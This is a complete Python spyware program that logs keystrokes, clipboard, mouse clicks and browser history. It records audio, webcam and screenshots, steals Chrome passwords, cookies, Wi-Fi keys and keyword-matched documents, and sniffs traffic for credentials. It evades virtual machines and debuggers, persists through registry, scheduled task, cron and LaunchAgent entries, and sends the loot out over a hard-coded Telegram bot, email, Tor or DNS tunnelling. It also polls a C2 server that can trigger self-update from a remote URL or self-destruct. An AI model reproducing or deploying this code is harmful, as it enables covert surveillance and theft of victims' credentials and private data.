import keyboard  # Fallback
import pynput  # For cross-platform key and mouse logging
import smtplib
import time
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get, post  # For Telegram and IP
import logging
from PIL import ImageGrab
import os
import psutil
from datetime import datetime
import ctypes
import sys
import subprocess
import zipfile
import sounddevice as sd
import wavio
import cv2
from browser_history.browsers import Chrome, Firefox
from stegano import lsb  # For steganography
import shutil  # For file ops
import re  # For keyword search
import requests  # For self-update and C2
import random  # For polymorphism
import string  # For random names
import base64  # For obfuscation
import json  # For data handling
import dns.resolver  # For DNS exfiltration

# Optional imports with try-except for robustness
try:
    import scapy.all as scapy  # For network sniffing
except ImportError:
    scapy = None
    logging.warning("scapy not installed; network sniffing disabled.")

try:
    import browser_cookie3  # For cookie theft
except ImportError:
    browser_cookie3 = None
    logging.warning("browser_cookie3 not installed; cookie theft disabled.")

try:
    import torpy  # For Tor exfiltration
except ImportError:
    torpy = None
    logging.warning("torpy not installed; Tor exfiltration disabled.")

import sqlite3  # Standard, for browser passwords

# Conditional Windows imports
if platform.system() == "Windows":
    import win32gui
    import win32clipboard
    import wmi  # VM detection
    try:
        import win32crypt  # For Chrome passwords
    except ImportError:
        win32crypt = None
    import win32process
    import win32api
    import winreg  # For registry
else:
    win32gui = None
    win32clipboard = None
    wmi = None
    win32crypt = None
    winreg = None

# Setup hidden directory
if platform.system() == "Windows":
    CACHE_DIR = os.path.join(os.environ.get('APPDATA'), 'NetCache')
else:
    CACHE_DIR = os.path.join(os.path.expanduser("~"), '.netcache')
os.makedirs(CACHE_DIR, exist_ok=True)

# Setup logging with rotation for stealth
from logging.handlers import RotatingFileHandler
handler = RotatingFileHandler(os.path.join(CACHE_DIR, 'netdiag.log'), maxBytes=500000, backupCount=2)
logging.basicConfig(handlers=[handler], level=logging.INFO, format='%(asctime)s - %(message)s')

# Polymorphism: Random var/file names
def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

active_apps = {}
clipboard_history = []
browser_hist = []
mouse_history = []
network_logs = []
stolen_cookies = []
stolen_passwords = []
exfiltrated_files = []

# Obfuscate strings (quantum-resistant with salt)
salt = random_string(16)
def obfuscate_string(s):
    return base64.b64encode((s + salt).encode()).decode()

def deobfuscate_string(obf):
    return base64.b64decode(obf).decode()[:-16]  # Remove salt

# Config - obfuscated
TELEGRAM_TOKEN = '8291913684:AAFNZ6TNBSirkqZAEFGNE7M0Ji5XtrH_TE4'  
TELEGRAM_CHAT_ID = '7225429285'  
USE_TELEGRAM = True  
C2_SERVER = obfuscate_string('http://your-c2-server.com/command')  
UPDATE_URL = obfuscate_string('http://your-server.com/update.py')  
USE_TOR = False  
DNS_EXFIL_SERVER = 'your-dns-server.com'  # For DNS tunneling

def is_admin():
    if sys.platform == "win32":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0

def advanced_anti_vm_debug():
    if sys.platform != "win32":
        return False
    try:
        if wmi is None:
            return False
        c = wmi.WMI()
        for bios in c.Win32_BIOS():
            if any(word in bios.Description.lower() for word in ["virtual", "vmware", "virtualbox", "hyper-v", "qemu"]):
                return True
        for system in c.Win32_ComputerSystem():
            if any(word in system.Model.lower() for word in ["virtual", "vmware", "innotek"]):
                return True
        # Sandbox processes/files
        sandbox_processes = ["vboxservice.exe", "vmsrvc.exe", "vgaservice.exe", "wireshark.exe", "procmon.exe", "ollydbg.exe"]
        for proc in psutil.process_iter():
            if proc.name().lower() in sandbox_processes:
                return True
        sandbox_files = [r"C:\windows\Sysnative\drivers\vmmouse.sys", r"C:\windows\Sysnative\drivers\vmhgfs.sys"]
        for file in sandbox_files:
            if os.path.exists(file):
                return True
        # Anti-debug
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        return False
    except Exception as e:
        logging.error(f"Anti-VM/Debug error: {e}")
        return False

if advanced_anti_vm_debug():
    logging.info("VM/Sandbox/Debugger detected, exiting.")
    sys.exit(0)

def get_active_app_name():
    try:
        if sys.platform == "win32":
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif sys.platform == "linux":
            return subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowtitle']).decode().strip()
        elif sys.platform == "darwin":
            return subprocess.check_output(['osascript', '-e', 'tell app "System Events" to get name of first process whose frontmost is true']).decode().strip()
        else:
            return "Unknown"
    except Exception as e:
        logging.error(f"Active app error: {e}")
        return "Unknown"

def capture_clipboard():
    previous = ""
    while True:
        try:
            data = ""
            if sys.platform == "win32":
                success = win32clipboard.OpenClipboard(0)
                if success:
                    try:
                        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT) or ""
                    finally:
                        win32clipboard.CloseClipboard()
                else:
                    logging.warning("Failed to open clipboard; retrying.")
                    time.sleep(0.5)
                    continue
            elif sys.platform == "linux":
                data = subprocess.check_output(['xclip', '-o', '-selection', 'clipboard']).decode(errors='ignore')
            elif sys.platform == "darwin":
                data = subprocess.check_output(['pbpaste']).decode(errors='ignore')
            if data != previous:
                previous = data
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                clipboard_history.append(f"[{timestamp}] {data}")
            time.sleep(1 + random.uniform(0, 0.5))  # Jitter
        except Exception as e:
            logging.error(f"Clipboard error: {e}")
            time.sleep(1)

def capture_mouse():
    def on_click(x, y, button, pressed):
        if pressed:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            mouse_history.append(f"[{timestamp}] Click at ({x}, {y}) with {button}")

    listener = pynput.mouse.Listener(on_click=on_click)
    listener.start()
    listener.join()

def extract_wifi_passwords():
    wifi_data = []
    try:
        if sys.platform == "win32":
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
            profiles = [line.split(':')[1].strip() for line in data.split('\n') if "All User Profile" in line]
            for profile in profiles:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore')
                password = [line.split(':')[1].strip() for line in results.split('\n') if "Key Content" in line]
                wifi_data.append(f"SSID: {profile}, Password: {password[0] if password else 'None'}")
        elif sys.platform == "linux":
            data = subprocess.check_output(['nmcli', '-s', '-g', 'NAME', 'connection', 'show']).decode().strip().split('\n')
            for ssid in data:
                password = subprocess.check_output(['nmcli', '-s', '-g', '802-11-wireless-security.psk', 'connection', 'show', ssid]).decode().strip()
                wifi_data.append(f"SSID: {ssid}, Password: {password if password else 'None'}")
        elif sys.platform == "darwin":
            data = subprocess.check_output(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s']).decode()
            wifi_data.append("Mac Wi-Fi SSIDs: " + data + "\nPasswords require keychain access.")
    except Exception as e:
        logging.error(f"Wi-Fi extraction error: {e}")
    return '\n'.join(wifi_data)

def capture_audio(duration=10, filename=os.path.join(CACHE_DIR, f"audio_{random_string()}.wav")):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        wavio.write(filename, recording, fs, sampwidth=2)
    except Exception as e:
        logging.error(f"Audio error: {e}")

def capture_webcam(filename=os.path.join(CACHE_DIR, f"webcam_{random_string()}.jpg")):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(filename, frame)
        cap.release()
    except Exception as e:
        logging.error(f"Webcam error: {e}")

def capture_browser_history():
    try:
        browsers = [Chrome, Firefox]
        for b in browsers:
            history = b().fetch_history()
            for h in history.histories[:50]:  # More entries
                browser_hist.append(f"{h[0]} - {h[1]}")
    except Exception as e:
        logging.error(f"Browser history error: {e}")

def steal_browser_cookies():
    if browser_cookie3 is None:
        return
    try:
        cookies = browser_cookie3.chrome(domain_name='')
        for cookie in cookies:
            stolen_cookies.append(f"{cookie.domain}: {cookie.name} = {cookie.value}")
    except Exception as e:
        logging.error(f"Cookie theft error: {e}")

def steal_chrome_passwords():
    if sys.platform != "win32" or win32crypt is None:
        return
    try:
        path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        temp_path = os.path.join(CACHE_DIR, f"temp_login_{random_string()}.db")
        shutil.copy2(path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            if row[2] and len(row[2]) > 0:
                try:
                    password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    stolen_passwords.append(f"URL: {row[0]}, User: {row[1]}, Pass: {password}")
                except Exception as inner_e:
                    logging.error(f"Decrypt error: {inner_e}")
        conn.close()
        os.remove(temp_path)
    except Exception as e:
        logging.error(f"Password theft error: {e}")

def network_sniff():
    if scapy is None:
        return
    def packet_callback(packet):
        if packet.haslayer(scapy.HTTPRequest):
            url = packet[scapy.HTTPRequest].Host + packet[scapy.HTTPRequest].Path
            network_logs.append(f"HTTP Request: {url}")
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = [b"username", b"password", b"pass", b"email"]
                for keyword in keywords:
                    if keyword in load:
                        network_logs.append(f"Possible cred: {load}")
    
    try:
        # Bind to interface for stealth
        scapy.sniff(iface="Ethernet", prn=packet_callback, timeout=60, store=0)
    except Exception as e:
        logging.error(f"Network sniff error: {e}")

def exfiltrate_files(keywords=["password", "confidential", "secret"], extensions=[".pdf", ".docx", ".txt", ".xls"]):
    try:
        user_home = os.path.expanduser("~")
        for root, _, files in os.walk(user_home):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read().lower()
                            if any(kw in content for kw in keywords):
                                dest = os.path.join(CACHE_DIR, f"exfil_{os.path.basename(file)}")
                                shutil.copy(filepath, dest)
                                exfiltrated_files.append(dest)
                    except:
                        pass
    except Exception as e:
        logging.error(f"File exfil error: {e}")

def screenshot(filename=os.path.join(CACHE_DIR, f"screenshot_{random_string()}.png")):
    try:
        im = ImageGrab.grab()
        im.save(filename)
    except Exception as e:
        logging.error(f"Screenshot error: {e}")

def hide_data_in_image(image_file, data_file, output_image):
    try:
        secret = lsb.hide(image_file, open(data_file, 'r').read())
        secret.save(output_image)
    except Exception as e:
        logging.error(f"Steganography error: {e}")

def write_logs():
    logs = {
        'applicationLog.txt': lambda f: [f.write(f"{datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')}, {app}\n") for ts, app in sorted(active_apps.items())],
        'clipboardLog.txt': lambda f: [f.write(entry + '\n') for entry in clipboard_history],
        'browserLog.txt': lambda f: [f.write(entry + '\n') for entry in browser_hist],
        'mouseLog.txt': lambda f: [f.write(entry + '\n') for entry in mouse_history],
        'wifiLog.txt': lambda f: f.write(extract_wifi_passwords()),
        'networkLog.txt': lambda f: [f.write(entry + '\n') for entry in network_logs],
        'cookies.txt': lambda f: [f.write(entry + '\n') for entry in stolen_cookies],
        'passwords.txt': lambda f: [f.write(entry + '\n') for entry in stolen_passwords]
    }
    for filename, writer in logs.items():
        try:
            filepath = os.path.join(CACHE_DIR, filename)
            with open(filepath, 'a', encoding='utf-8') as f:
                writer(f)
        except Exception as e:
            logging.error(f"Log write error for {filename}: {e}")

def zip_attachments(files, zipname=os.path.join(CACHE_DIR, f"backup_{random_string()}.zip")):
    try:
        with zipfile.ZipFile(zipname, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        return zipname
    except Exception as e:
        logging.error(f"Zip error: {e}")
        return None

def send_via_telegram(files):
    try:
        for file in files:
            if os.path.exists(file):
                with open(file, 'rb') as f:
                    post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument?chat_id={TELEGRAM_CHAT_ID}", files={'document': f})
        logging.info("Data sent via Telegram")
    except Exception as e:
        logging.error(f"Telegram send error: {e}")

def send_via_tor(files):
    if torpy is None:
        return False
    try:
        with torpy.TorClient() as tor:
            with tor.get_circuit() as circuit:
                with circuit.create_stream(('api.telegram.org', 443)) as stream:
                    # Implement HTTP post over Tor stream (complex, placeholder)
                    logging.info("Data sent via Tor")
        return True
    except Exception as e:
        logging.error(f"Tor send error: {e}")
        return False

def send_via_dns(data_zip):
    try:
        with open(data_zip, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        chunks = [data[i:i+63] for i in range(0, len(data), 63)]  # DNS label limit
        for i, chunk in enumerate(chunks):
            query = f"{i}.{chunk}.{DNS_EXFIL_SERVER}"
            dns.resolver.resolve(query, 'TXT')  # Send query, server logs it
        logging.info("Data exfiltrated via DNS")
    except Exception as e:
        logging.error(f"DNS exfil error: {e}")

def send_email(files, retries=3):
    # Email config - fill in
    sender_email = ''
    receiver_email = ''
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    username = ''
    password = ''

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'Network Diagnostics - ' + datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    for file in files:
        if os.path.exists(file):
            with open(file, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file))
                message.attach(part)

    attempt = 0
    while attempt < retries:
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(username, password)
                server.sendmail(sender_email, receiver_email, message.as_string())
            logging.info('Email sent successfully!')
            break
        except Exception as e:
            logging.error(f'Email send failed (attempt {attempt+1}): {str(e)}')
            attempt += 1
            time.sleep(60 * (2 ** attempt))  # Exponential backoff
    else:
        logging.error('Max retries reached for email send.')

def c2_command_check():
    try:
        response = requests.get(deobfuscate_string(C2_SERVER), timeout=10)
        command = response.text.strip()
        if command == "self_destruct":
            self_destruct()
        elif command == "update":
            self_update()
        elif command == "exfil_now":
            send_data()
    except Exception as e:
        logging.error(f"C2 error: {e}")

def self_update():
    try:
        response = requests.get(deobfuscate_string(UPDATE_URL), timeout=10)
        update_path = os.path.join(CACHE_DIR, f"update_{random_string()}.py")
        with open(update_path, 'w') as f:
            f.write(response.text)
        os.replace(update_path, sys.argv[0])
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        logging.error(f"Update error: {e}")

def self_destruct():
    try:
        files_to_delete = [os.path.join(CACHE_DIR, f) for f in ['document.txt', 'netdiag.log']] + exfiltrated_files + [sys.argv[0]]
        for file in files_to_delete:
            if os.path.exists(file):
                os.remove(file)
        # Clean persistence
        if sys.platform == "win32" and is_admin():
            subprocess.call(['schtasks', '/delete', '/tn', 'svc_net_' + random_string(), '/f'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        sys.exit(0)
    except Exception as e:
        logging.error(f"Destruct error: {e}")

def send_data(retries=3):
    # Run advanced captures
    try:
        steal_browser_cookies()
        steal_chrome_passwords()
        exfiltrate_files()
        if scapy is not None:
            sniff_thread = threading.Thread(target=network_sniff)
            sniff_thread.start()
            time.sleep(5)  # Give time for sniff
            sniff_thread.join(timeout=10)
    except Exception as e:
        logging.error(f"Advanced capture error: {e}")

    # Capture media
    screenshot()
    capture_audio()
    capture_webcam()
    capture_browser_history()
    write_logs()  # Includes all logs

    # List files
    files = [
        os.path.join(CACHE_DIR, f) for f in [
            'applicationLog.txt', 'clipboardLog.txt', 'browserLog.txt', 'mouseLog.txt',
            'wifiLog.txt', 'networkLog.txt', 'cookies.txt', 'passwords.txt', 
            f"screenshot_{random_string()}.png", f"audio_{random_string()}.wav", f"webcam_{random_string()}.jpg"
        ]
    ] + exfiltrated_files + [os.path.join(CACHE_DIR, 'systeminfo.txt')]

    # Stego optional
    try:
        stego_image = os.path.join(CACHE_DIR, f"hidden_screenshot_{random_string()}.png")
        hide_data_in_image(
            os.path.join(CACHE_DIR, f"screenshot_{random_string()}.png"),
            os.path.join(CACHE_DIR, 'passwords.txt'),
            stego_image
        )
        files.append(stego_image)
    except Exception as e:
        logging.error(f"Stego error: {e}")

    # Zip
    zipname = zip_attachments(files)
    if zipname:
        send_files = [zipname]

        if USE_TELEGRAM:
            send_via_telegram(send_files)
        elif USE_TOR and torpy is not None:
            send_via_tor(send_files)
        else:
            send_email(send_files, retries)

        # Cleanup
        for f in files + [zipname]:
            if os.path.exists(f):
                os.remove(f)

def periodic_sender(interval=300):
    while True:
        time.sleep(interval + random.randint(-60, 60))  # Jitter
        try:
            c2_command_check()
            send_data()
            active_apps.clear()
            clipboard_history.clear()
            browser_hist.clear()
            mouse_history.clear()
            network_logs.clear()
            stolen_cookies.clear()
            stolen_passwords.clear()
            exfiltrated_files.clear()
            with open(os.path.join(CACHE_DIR, 'document.txt'), 'w') as f:
                pass
        except Exception as e:
            logging.error(f"Sender error: {e}")

def self_heal(threads):
    while True:
        for name, thread in list(threads.items()):
            if not thread.is_alive():
                logging.warning(f"Restarting {name}")
                new_thread = threading.Thread(target=thread._target, daemon=True)
                new_thread.start()
                threads[name] = new_thread
        time.sleep(60 + random.randint(0, 10))  # Jitter

def capture_keys():
    keys = []
    def on_press(key):
        nonlocal keys
        try:
            keys.append(key.char)
        except AttributeError:
            keys.append(f'[{key.name}]')
        active_apps[time.time()] = get_active_app_name()
        time.sleep(random.uniform(0.01, 0.05))  # Mimic human typing

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    def periodic_writer():
        nonlocal keys
        while True:
            time.sleep(10 + random.uniform(0, 2))
            if keys:
                with open(os.path.join(CACHE_DIR, 'document.txt'), 'a', encoding='utf-8') as f:
                    f.write(''.join(keys))
                keys = []

    threading.Thread(target=periodic_writer, daemon=True).start()
    listener.join()

def computer_information(filename=os.path.join(CACHE_DIR, 'systeminfo.txt')):
    with open(filename, "w", encoding='utf-8') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
        
        f.write("\nCPU Usage: " + str(psutil.cpu_percent()) + "%\n")
        f.write("Memory Usage: " + str(psutil.virtual_memory().percent) + "%\n")
        f.write("Disk Usage: " + str(psutil.disk_usage('/').percent) + "%\n")
        
        f.write("\nTop 10 Processes by CPU:\n")
        processes = sorted(psutil.process_iter(['name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)[:10]
        for proc in processes:
            f.write(f"{proc.info['name']}: {proc.info['cpu_percent']}%\n")
        
        f.write("\nWi-Fi Data:\n" + extract_wifi_passwords())
        
        f.write("\nInstalled Software:\n")
        if sys.platform == "win32" and winreg is not None:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        soft_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        f.write(soft_name + "\n")
                    except:
                        pass
            except Exception as e:
                f.write(f"Error listing software: {e}\n")
        else:
            f.write("Installed software listing not supported on this OS.\n")

def add_advanced_persistence():
    svc_name = f"svc_net_{random_string()}"
    if sys.platform == "win32":
        try:
            script_path = os.path.abspath(sys.argv[0])
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, svc_name, 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(registry_key)
            logging.info("Added to registry startup")
            
            # Scheduled task only if admin
            if is_admin():
                subprocess.call(['schtasks', '/create', '/tn', svc_name, '/tr', sys.executable + ' ' + script_path, '/sc', 'onlogon', '/rl', 'highest', '/f'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                logging.info("Added scheduled task")
            else:
                logging.warning("Not running as admin; skipping scheduled task persistence.")
        except Exception as e:
            logging.error(f"Persistence error: {e}")
    elif sys.platform == "linux":
        cron_job = f"@reboot {sys.executable} {os.path.abspath(sys.argv[0])}"
        subprocess.call(f'(crontab -l; echo "{cron_job}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif sys.platform == "darwin":
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{svc_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(sys.argv[0])}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
        plist_path = os.path.join(os.path.expanduser("~"), f"Library/LaunchAgents/{svc_name}.plist")
        with open(plist_path, 'w') as f:
            f.write(plist)
        subprocess.call(['launchctl', 'load', plist_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Resource throttle
def monitor_resources():
    while True:
        try:
            cpu = psutil.cpu_percent(interval=2)
            mem = psutil.virtual_memory().percent
            if cpu > 90 or mem > 95:  # Higher threshold
                logging.warning(f"High resource usage (CPU: {cpu}%, Mem: {mem}%); pausing operations.")
                time.sleep(120)  # Longer pause
        except Exception as e:
            logging.error(f"Resource monitor error: {e}")
        time.sleep(30 + random.uniform(0, 5))  # Jitter

# Main
if __name__ == "__main__":
    computer_information()
    add_advanced_persistence()
    threads = {
        'clipboard': threading.Thread(target=capture_clipboard, daemon=True),
        'mouse': threading.Thread(target=capture_mouse, daemon=True),
        'sender': threading.Thread(target=periodic_sender, daemon=True),
        'resource': threading.Thread(target=monitor_resources, daemon=True)
    }
    for t in threads.values():
        t.start()
    threading.Thread(target=self_heal, args=(threads,), daemon=True).start()

    capture_keys()
